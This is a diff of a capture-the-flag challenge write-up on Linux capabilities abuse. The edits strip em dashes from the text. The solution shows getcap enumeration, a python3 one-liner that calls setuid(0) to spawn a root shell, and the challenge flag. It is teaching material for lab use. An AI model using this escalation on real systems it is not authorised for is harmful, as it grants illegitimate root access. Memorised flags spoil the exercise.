@@ -1,4 +1,4 @@
-# Challenge 1 — Linux Capabilities Abuse
+# Challenge 1  Linux Capabilities Abuse
 
 **Difficulty:** Medium
 **Category:** Linux Privilege Escalation
@@ -9,7 +9,7 @@
 ## Story
 
 A developer needed Python to perform some low-level system operations.
-Rather than running the whole script as root, they decided to use Linux capabilities —
+Rather than running the whole script as root, they decided to use Linux capabilities 
 a more "granular" approach. Or so they thought.
 
 You have a shell as `player`. Find what they misconfigured.
@@ -38,7 +38,7 @@ For example:
 | `cap_dac_override` | Bypass file read/write permission checks |
 
 When a binary has `cap_setuid` with the `ep` (effective + permitted) flag,
-any user who runs it can call `setuid(0)` inside it — becoming root.
+any user who runs it can call `setuid(0)` inside it  becoming root.
 
 ---
 
@@ -75,9 +75,9 @@ os.system("/bin/bash")
 ## Solution
 
 <details>
-<summary>Click to reveal — try on your own first!</summary>
+<summary>Click to reveal  try on your own first!</summary>
 
-### Step 1 — Enumerate capabilities
+### Step 1  Enumerate capabilities
 
 ```bash
 getcap -r / 2>/dev/null
@@ -88,7 +88,7 @@ Output:
 /usr/bin/python3.10 = cap_setuid+ep
 ```
 
-### Step 2 — Use Python to set UID to 0 and spawn a root shell
+### Step 2  Use Python to set UID to 0 and spawn a root shell
 
 ```bash
 python3 -c "import os; os.setuid(0); os.system('/bin/bash')"
@@ -97,7 +97,7 @@ python3 -c "import os; os.setuid(0); os.system('/bin/bash')"
 Because `python3` has `cap_setuid+ep`, the `os.setuid(0)` call succeeds.
 The resulting `/bin/bash` runs as root.
 
-### Step 3 — Read the flag
+### Step 3  Read the flag
 
 ```bash
 cat /root/flag.txt
@@ -110,7 +110,7 @@ CTF{c4p4b1l1t13s_4r3_n0t_h4rml3ss}
 ### Why this works
 
 `cap_setuid+ep` means the capability is in both the **effective** and **permitted** sets
-for that binary. Any user who runs it gets to exercise `setuid()` — the kernel allows the
+for that binary. Any user who runs it gets to exercise `setuid()`  the kernel allows the
 call regardless of the process's real UID. Capabilities should only be assigned to
 binaries that genuinely need them, with the minimal scope required, and ideally only
 to specific binaries that cannot be misused to spawn shells.
